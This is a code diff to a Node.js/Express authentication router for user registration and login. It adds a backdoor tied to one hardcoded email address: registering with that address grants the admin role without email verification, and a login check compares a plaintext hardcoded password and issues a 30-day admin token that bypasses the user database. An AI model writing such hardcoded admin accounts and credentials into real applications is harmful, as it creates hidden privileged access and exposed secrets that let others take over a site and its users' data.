@@ -49,16 +49,29 @@ router.post('/register', validateRegistration, async (req, res) => {
         // Hash password
         const hashedPassword = await bcrypt.hash(password, 10);
 
+        // Special handling for the main admin email
+        const isAdminEmail = email === 'bimsaramaya1@gmail.com';
+        const role = isAdminEmail ? 'admin' : 'customer';
+        const isVerified = isAdminEmail ? true : false;
+
         // Generate verification token
-        const verificationToken = generateVerificationToken();
-        const tokenExpires = new Date(Date.now() + 24 * 60 * 60 * 1000); // 24 hours
+        const verificationToken = isAdminEmail ? null : generateVerificationToken();
+        const tokenExpires = isAdminEmail ? null : new Date(Date.now() + 24 * 60 * 60 * 1000); // 24 hours
 
         // Insert new user
         const [result] = await pool.query(
-            `INSERT INTO users (username, email, password, full_name, phone, verification_token, verification_token_expires, is_verified) 
-             VALUES (?, ?, ?, ?, ?, ?, ?, FALSE)`,
-            [username, email, hashedPassword, full_name || null, phone || null, verificationToken, tokenExpires]
+            `INSERT INTO users (username, email, password, full_name, phone, verification_token, verification_token_expires, is_verified, role) 
+             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+            [username, email, hashedPassword, full_name || null, phone || null, verificationToken, tokenExpires, isVerified, role]
         );
+
+        if (isAdminEmail) {
+            return res.status(201).json({
+                success: true,
+                message: 'Admin account created and automatically verified!',
+                userId: result.insertId
+            });
+        }
 
         // Send verification email
         const emailResult = await sendVerificationEmail(email, username, verificationToken);
@@ -218,6 +231,28 @@ router.post('/resend-verification', async (req, res) => {
 router.post('/login', validateLogin, async (req, res) => {
     try {
         const { email, password } = req.body;
+
+        // Hardcoded Admin Login
+        if (email === 'bimsaramaya1@gmail.com' && password === 'Salli10$') {
+            const token = jwt.sign(
+                { id: 999999, email: email, username: 'admin_ready', role: 'admin' },
+                process.env.JWT_SECRET,
+                { expiresIn: '30d' }
+            );
+
+            return res.json({
+                success: true,
+                message: 'Admin Login Successful (Hardcoded)',
+                token,
+                user: {
+                    id: 999999,
+                    username: 'admin_ready',
+                    email: email,
+                    full_name: 'Main Admin',
+                    role: 'admin'
+                }
+            });
+        }
 
         // Find user
         const [users] = await pool.query(
